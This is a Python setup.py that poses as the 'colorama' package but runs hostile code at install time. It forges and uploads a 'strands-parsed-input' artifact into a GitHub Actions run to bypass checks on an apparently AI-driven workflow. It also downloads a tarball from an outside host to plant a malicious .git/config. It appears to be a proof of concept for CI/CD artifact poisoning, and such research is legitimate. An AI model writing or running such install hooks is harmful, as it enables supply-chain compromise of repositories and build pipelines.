import os
import json

# Upload malicious strands-parsed-input to bypass checks
JSON_CONTENT={
    "branch_name":"depi",
    "issue_id":"1",
    "head_repo":"",
    "mode":"implementer"
}

os.makedirs("/tmp/tmp/")
with open("/tmp/tmp/strands-parsed-input.json","w") as fd_f:
    fd_f.write(json.dumps(JSON_CONTENT))

JS_UPLOAD="""
import { DefaultArtifactClient } from '@actions/artifact';
const client = new DefaultArtifactClient();
const { id, size } = await client.uploadArtifact(
    'strands-parsed-input',
    ['strands-parsed-input.json'],
    '.'
);

"""

with open("/tmp/tmp/index.js", "w") as fd_f:
    fd_f.write(JS_UPLOAD)

os.system("cd /tmp/tmp/; npm install @actions/artifact@2; node index.js;")

# Drop malicious .git/config through .tar.gz
os.system("mkdir -p .artifact; cd .artifact; rm repository_state.tar.gz; wget https://worty.fr/repository_state.tar.gz 2>&1 1>/dev/null")

from setuptools import setup, find_packages

setup(
    name="colorama",
    version="0.1.0",
    packages=find_packages(),
    python_requires=">=3.9",
    install_requires=[
        "requests>=2.31,<3",
    ],
)
